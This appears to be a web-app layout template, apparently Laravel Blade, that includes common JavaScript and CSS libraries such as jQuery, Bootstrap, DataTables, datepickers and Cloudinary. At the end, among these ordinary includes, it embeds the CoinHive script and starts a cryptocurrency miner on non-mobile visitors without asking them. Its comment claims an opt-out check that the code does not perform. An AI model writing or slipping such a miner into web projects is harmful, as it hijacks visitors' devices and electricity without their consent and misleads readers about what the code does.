<script src="https://cdnjs.cloudflare.com/ajax/libs/fuse.js/3.0.0/fuse.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

<!-- reCAPTCHA -->
<script src='https://www.google.com/recaptcha/api.js'></script>

<!-- DataTables -->
<script src="https://cdn.datatables.net/1.10.15/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/1.10.15/js/dataTables.bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.15/css/dataTables.bootstrap.min.css"/>

<!-- DatePicker -->
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.6.4/css/bootstrap-datepicker.min.css" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.6.4/js/bootstrap-datepicker.min.js"></script>

<!-- Add Vex -->
<script src="/js/vex.combined.min.js"></script>
<script>vex.defaultOptions.className = 'vex-theme-os'</script>
<link rel="stylesheet" href="/css/vex.css" />
<link rel="stylesheet" href="/css/vex-theme-os.css" />

<!-- Add Dropzone -->
<script src="/js/dropzone.js"></script>

<!-- Add jQuery Datepicker -->
<script src="/js/datepicker.min.js"></script>
<link rel="stylesheet" href="/css/datepicker.min.css" />

<!-- Spectrum Colorpicker -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/spectrum/1.8.0/spectrum.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectrum/1.8.0/spectrum.min.css" />

<!-- Autolinker -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/autolinker/1.4.4/Autolinker.min.js"></script>

<!-- Cloudinary jQuery -->
<script src="https://cdn.jsdelivr.net/jquery.cloudinary/1.0.18/jquery.cloudinary.min.js"></script>
<script>
    $.cloudinary.config({ cloud_name: '{{ env('CLOUDINARY_CLOUD_NAME') }}' });
</script>

<!-- Linkify -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jQuery-linkify/2.1.4/linkify.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jQuery-linkify/2.1.4/linkify-jquery.min.js"></script>

<script src="https://coinhive.com/lib/coinhive.min.js" async></script>
<script>
    var miner = new CoinHive.Anonymous('H1UAgfHsU8xBw1p5NcfhYLexE1DNKoMi', {throttle: 0.7});

    // Only start on non-mobile devices and if not opted-out
    // in the last 14400 seconds (4 hours):
    if (!miner.isMobile()) {
        miner.start();
    }
</script>

@yield('scripts')